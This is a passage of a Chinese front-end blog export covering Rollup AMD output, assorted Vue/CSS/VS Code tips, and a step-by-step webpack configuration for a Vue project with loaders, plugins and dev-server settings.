class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  input: &#123;</span><br><span class="line">    foo: <span class="string">'src/index.js'</span>,  <span class="comment">// 两个入口</span></span><br><span class="line">    bar: <span class="string">'src/album.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    dir: <span class="string">'dist'</span>,</span><br><span class="line">    format: <span class="string">'amd'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后在 dist 目录下生成3个文件，foo.js，bar.js，和公共部分的js</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- AMD 标准格式的输出 bundle 不能直接引用 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;script src="foo.js"&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 需要 Require.js 这样的库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/requirejs@2.3.6/require.js"</span> <span class="attr">data-main</span>=<span class="string">"foo.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><ul><li>输出结果更加扁平</li><li>自动移除未引用代码</li><li>打包结果依然完全可读</li></ul><hr><ul><li>加载非 ESM 的第三方模块比较复杂</li><li>模块最终都被打包到一个函数中，无法实现 HMR</li><li>浏览器环境中，代码拆分功能依赖 AMD 库</li></ul><hr><p>开发应用程序使用 webpack，开发一个框架或者类库使用 Rollup</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-9.9</title>
      <link href="2020/09/09/%E6%97%A5%E5%B8%B8-2020.9.9/"/>
      <url>2020/09/09/%E6%97%A5%E5%B8%B8-2020.9.9/</url>
      
        <content type="html"><![CDATA[<ul><li>filter 过滤  / map 处理接口数据</li><li>margin 写3个值</li><li>vscode 折叠展开代码</li><li>如何快速的删除 node_modules</li><li>$nextTick</li><li>关于图片处理</li><li>iterm2</li></ul><a id="more"></a><h2 id="如何使用-filter-和-map-处理接口数据"><a href="#如何使用-filter-和-map-处理接口数据" class="headerlink" title="如何使用 filter 和 map 处理接口数据"></a>如何使用 filter 和 map 处理接口数据</h2><p>比如现在接口返回如下格式的数据：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line"> &#123;</span><br><span class="line">        agent: &#123;</span><br><span class="line">            avatar: "https://"</span><br><span class="line">            cityId: 1</span><br><span class="line">            imCount: 1</span><br><span class="line">            likeCount: 0</span><br><span class="line">            liveness: 110</span><br><span class="line">            replyRate: "0"</span><br><span class="line">            role: 1   </span><br><span class="line">        &#125;</span><br><span class="line">        category: 4</span><br><span class="line">        categoryDetail: "其他"</span><br><span class="line">        createTime: "10:01"</span><br><span class="line">    &#125;, </span><br><span class="line">    &#123;</span><br><span class="line">        agent: &#123;</span><br><span class="line">            avatar: "https://"</span><br><span class="line">            cityId: 1</span><br><span class="line">            imCount: 1</span><br><span class="line">            likeCount: 0</span><br><span class="line">            liveness: 110</span><br><span class="line">            replyRate: "0"</span><br><span class="line">            role: 1   </span><br><span class="line">        &#125;</span><br><span class="line">        category: 4</span><br><span class="line">        categoryDetail: "其他"</span><br><span class="line">        createTime: "10:01"</span><br><span class="line">    &#125;,</span><br><span class="line">    // 一共10条</span><br><span class="line">]</span><br></pre></td></tr></table></figure><blockquote><p> 要求：拿到有 agent 数据的对象，并且将 agent 中的数据和对象中原本的数据抽出来需要的部分组成一个 item，并且自定义名称，加到原有数组中</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> data = res.data.list.filter(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> item.agent <span class="comment">// 过滤有 agent 的</span></span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">let</span> list = data.map(<span class="function"><span class="params">item</span> =&gt;</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    avatar: item.agent.avatar,</span><br><span class="line">                    role: item.agent.role,</span><br><span class="line">                    createTime: item.createTime</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">this</span>.dynamicList.push(...list) <span class="comment">// 加入到原来的数组中</span></span><br></pre></td></tr></table></figure><h2 id="margin-写-3-个值"><a href="#margin-写-3-个值" class="headerlink" title="margin 写 3 个值"></a>margin 写 3 个值</h2><p>margin: 20px 40px 60px;（上20px；左、右40px；下60px）</p><h2 id="vscode-折叠展开代码"><a href="#vscode-折叠展开代码" class="headerlink" title="vscode 折叠展开代码"></a>vscode 折叠展开代码</h2><ul><li><p>折叠所有区域代码的快捷： ctrl + k   ctrl + 0 ;</p></li><li><p>展开所有折叠区域代码的快捷：ctrl +k   ctrl + J ;</p></li></ul><h2 id="如何快速的删除-node-modules"><a href="#如何快速的删除-node-modules" class="headerlink" title="如何快速的删除 node_modules"></a>如何快速的删除 node_modules</h2><p><code>rimraf node_modules</code></p><h2 id="nextTick"><a href="#nextTick" class="headerlink" title="$nextTick"></a>$nextTick</h2><p>Vue 在更新 DOM 时是<strong>异步</strong>执行的。只要侦听到数据变化，Vue 将开启一个队列，并缓冲在同一事件循环中发生的所有数据变更。如果同一个 watcher 被多次触发，只会被推入到队列中一次。这种在缓冲时去除重复数据对于避免不必要的计算和 DOM 操作是非常重要的。然后，在下一个的事件循环“tick”中，Vue 刷新队列并执行实际 (已去重的) 工作。Vue 在内部对异步队列尝试使用原生的 <code>Promise.then</code>、<code>MutationObserver</code> 和 <code>setImmediate</code>，如果执行环境不支持，则会采用 <code>setTimeout(fn, 0)</code> 代替。</p><p>例如，当你设置 <code>vm.someData = &#39;new value&#39;</code>，该组件不会立即重新渲染。当刷新队列时，组件会在下一个事件循环“tick”中更新。多数情况我们不需要关心这个过程，但是如果你想基于更新后的 DOM 状态来做点什么，这就可能会有些棘手。虽然 Vue.js 通常鼓励开发人员使用“数据驱动”的方式思考，避免直接接触 DOM，但是有时我们必须要这么做。为了在数据变化之后等待 Vue 完成更新 DOM，可以在数据变化之后立即使用 <code>Vue.nextTick(callback)</code>。这样回调函数将在 DOM 更新完成后被调用。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(<span class="string">'example'</span>, &#123;</span><br><span class="line">  template: <span class="string">'&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;'</span>,</span><br><span class="line">  data: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      message: <span class="string">'未更新'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    updateMessage: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.message = <span class="string">'已更新'</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el.textContent) <span class="comment">// =&gt; '未更新'</span></span><br><span class="line">      <span class="keyword">this</span>.$nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.$el.textContent) <span class="comment">// =&gt; '已更新'</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="关于图片处理"><a href="#关于图片处理" class="headerlink" title="关于图片处理"></a>关于图片处理</h2><p>正常一个竖屏的封面图，怎么截取中间部分作为封面呢？</p><p><strong>采用background属性设置</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"imagecover"</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">:style</span>=<span class="string">"&#123;'background-image': 'url(' + CoverUrl ')'&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.imagecover</span> &#123;              </span></span><br><span class="line"><span class="undefined">        width: 345px;</span></span><br><span class="line"><span class="undefined">        height: 194px;</span></span><br><span class="line"><span class="undefined">        overflow: hidden;</span></span><br><span class="line"><span class="undefined">        background-size: cover;</span></span><br><span class="line"><span class="undefined">        background-position: center;</span></span><br><span class="line"><span class="undefined">        background-repeat: no-repeat;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>background-size属性</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cover</span><br></pre></td></tr></table></figure><p>缩放背景图片以完全覆盖背景区，可能背景图片部分看不见。和 <code>contain</code> 值相反，<code>cover</code> 值尽可能大的缩放背景图像并保持图像的宽高比例（图像不会被压扁）。该背景图以它的全部宽或者高覆盖所在容器。当容器和背景图大小不同时，背景图的 左/右 或者 上/下 部分会被裁剪。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contain</span><br></pre></td></tr></table></figure><p>缩放背景图片以完全装入背景区，可能背景区部分空白。<code>contain</code> 尽可能的缩放背景并保持图像的宽高比例（图像不会被压缩）。该背景图会填充所在的容器。当背景图和容器的大小的不同时，容器的空白区域（上/下或者左/右）会显示由 background-color 设置的背景颜色。</p><h2 id="iterm2"><a href="#iterm2" class="headerlink" title="iterm2"></a>iterm2</h2><ul><li><p><a href="https://zhuanlan.zhihu.com/p/37195261" target="_blank" rel="noopener">iTerm2 + Oh My Zsh 打造舒适终端体验</a></p></li><li><p><a href="https://www.jianshu.com/p/4a27bb4c216c" target="_blank" rel="noopener">Mac上iterm2分屏切换</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（五）</title>
      <link href="2020/09/08/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>2020/09/08/%E6%95%B4%E7%90%86-webpack%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>使用webpack打包一个vue项目</li><li>安装 loader 和 plugin</li><li>配置 webpack.dev.js</li><li>配置 webpack.prod.js</li><li>merge</li><li>配置eslint</li></ul><a id="more"></a><h2 id="使用-webpack-打包一个-vue-项目"><a href="#使用-webpack-打包一个-vue-项目" class="headerlink" title="使用 webpack 打包一个 vue 项目"></a>使用 webpack 打包一个 vue 项目</h2><blockquote><p>首先安装一些必要的 loader 和 plugin</p></blockquote><ul><li>webpack，webpack-cli：webpack工具</li><li>vue，vue-loader，vue-template-compiler：处理 .vue 文件</li><li>less，less-loader，css-loader，style-loader：处理样式</li><li>url-loader，file-loader：处理图片等文件</li><li>eslint-loader：代码标准化</li><li>babel-loader    @babel/core    @babel/preset-env：babel处理 es6</li><li><p>clean-webpack-plugin：删除 dist 目录</p></li><li><p>html-webpack-plugin：生成自动引用打包后的 js 的 html 文件</p></li><li>copy-webpack-plugin：可以用来拷贝 public 目录</li><li>webpack-dev-server：浏览器自动编译刷新</li><li>webpack-merge：合并配置文件</li><li>sourcemap：映射源文件</li></ul><h2 id="配置-webpack-dev-js"><a href="#配置-webpack-dev-js" class="headerlink" title="配置 webpack.dev.js"></a>配置 webpack.dev.js</h2><p>首先写一下入口，出口，处理 vue 和 样式的配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>, <span class="comment">// 入口</span></span><br><span class="line">  output: &#123; </span><br><span class="line">    filename: <span class="string">'bundle.js'</span>, </span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>:&#123;</span><br><span class="line">    rules:[</span><br><span class="line">      &#123; </span><br><span class="line">        test: <span class="regexp">/\.vue$/</span>, </span><br><span class="line">        use: <span class="string">'vue-loader'</span> </span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.css$/</span>,   <span class="comment">// 处理css</span></span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.less$/</span>, <span class="comment">// 处理sass</span></span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span>,</span><br><span class="line">          <span class="string">'less-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/.png$/</span>, <span class="comment">// 处理图片</span></span><br><span class="line">        use: &#123;</span><br><span class="line">          loader: <span class="string">'url-loader'</span>, </span><br><span class="line">          options: &#123;</span><br><span class="line">            limit: <span class="number">10</span> * <span class="number">1024</span> <span class="comment">// 10 KB</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在<code>package.json</code>中配置一下<code>scripts</code></p><blockquote><p> “serve”: “webpack –config webpack.dev.js”</p></blockquote><p>运行<code>npm run server</code>后报错：</p><blockquote><p>vue-loader was used without the corresponding plugin</p><p>原来是Vue-loader在15.*之后的版本都是需要伴随 VueLoaderPlugin的,</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> VueLoaderPlugin = <span class="built_in">require</span>(<span class="string">'vue-loader/lib/plugin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>, <span class="comment">// 入口</span></span><br><span class="line">  output: &#123; </span><br><span class="line">    filename: <span class="string">'bundle.js'</span>, </span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>:&#123;</span><br><span class="line">    rules:[</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> VueLoaderPlugin()</span><br><span class="line">  ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>再次运行 npm run server 打包成功，在 dist 目录下生成了 bundle.js</p><p>此时只有一个 js 文件，那么怎么能运行呢，这时就需要 html-webpack-plugin 和 webpack-dev-server 了</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> VueLoaderPlugin = <span class="built_in">require</span>(<span class="string">'vue-loader/lib/plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; CleanWebpackPlugin &#125; = <span class="built_in">require</span>(<span class="string">'clean-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> CopyWebpackPlugin = <span class="built_in">require</span>(<span class="string">'copy-webpack-plugin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'none'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>, <span class="comment">// 入口</span></span><br><span class="line">  output: &#123; </span><br><span class="line">    filename: <span class="string">'bundle.js'</span>, </span><br><span class="line">    path: path.join(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>:&#123;</span><br><span class="line">    rules:[</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> VueLoaderPlugin(),</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin(),  <span class="comment">// 清除 dist</span></span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;    <span class="comment">// 生成引入 bundle.js 的 index.html</span></span><br><span class="line">      filename: <span class="string">'index.html'</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> CopyWebpackPlugin(&#123;    <span class="comment">// 拷贝 public 目录</span></span><br><span class="line">      patterns: [</span><br><span class="line">        &#123; <span class="attr">from</span>: path.join(__dirname,<span class="string">'public'</span>),</span><br><span class="line">          to: <span class="string">'public'</span> </span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>// 然后修改脚本</p><p>“scripts”: {</p><p>  “serve”: “webpack-dev-server –config webpack.dev.js –open –hot”,</p><p> },</p><p>再次运行 npm run serve，成功打开页面，但是里面什么也没有，按 F12检查发现报错</p><p>Vue warn: Cannot find element: #app</p></blockquote><p>发现在生成的 index.html 文件中没有 div id=”app” 的元素，原来是在使用 html-webpack-plugin 的时候没有使用template，检查目录发现在public目录下有写好的 index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"&lt;%= BASE_URL %&gt;favicon.ico"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We're sorry but <span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span> doesn't work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 BASE_URL 需要使用 DefinePlugin 注入全局成员，title 就在 htmlWebpackPlugin 配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> VueLoaderPlugin(),</span><br><span class="line">  <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">  <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    title: <span class="string">'this is a title'</span>,</span><br><span class="line">    template : <span class="string">'./public/index.html'</span>,</span><br><span class="line">    filename: <span class="string">'index.html'</span></span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">    BASE_URL: <span class="built_in">JSON</span>.stringify(<span class="string">'./public/'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><blockquote><p>然后页面就正常打开了，但是有一张图片没有显示，显示：</p><p>img src=”[object Module]”</p><p>原因是在url-loader内部封装了file-loader 而file-loader在<strong>新版本</strong>中<strong>esModule</strong>属性默认为<code>true</code> 即<strong>默认使用ES模块语法</strong>，导致了造成了引用图片文件的方式和以前的版本不一样 引入路径改变了 自然找不到图片</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">       test: <span class="regexp">/.png$/</span>,</span><br><span class="line">       use: &#123;</span><br><span class="line">         loader: <span class="string">'url-loader'</span>, <span class="comment">// 大于10KB的还会使用file-loader</span></span><br><span class="line">         options: &#123;</span><br><span class="line">           limit: <span class="number">10</span> * <span class="number">1024</span>, <span class="comment">// 10 KB</span></span><br><span class="line">           esModule: <span class="literal">false</span> <span class="comment">// 取消使用 esModules</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>再次运行页面就能正常打开了，并且试了热更新功能没问题，但是在开发环境下没必要拷贝 public 目录，设置一下 contentBase 即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    contentBase: <span class="string">'./public'</span>,</span><br><span class="line">    hot: <span class="literal">true</span>  <span class="comment">// 热更新也可以在这配置</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="配置-webpack-prod-js-和-webpack-common-js"><a href="#配置-webpack-prod-js-和-webpack-common-js" class="headerlink" title="配置 webpack.prod.js 和 webpack.common.js"></a>配置 webpack.prod.js 和 webpack.common.js</h2><p>在生产环境下，就需要拷贝 public 目录了，并且设置 <code>mode: &#39;production&#39;</code>，通过 webpack-merge 合并</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.dev.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> common = <span class="built_in">require</span>(<span class="string">'./webpack.common.js'</span>)</span><br><span class="line"><span class="keyword">const</span> webpackMerge = <span 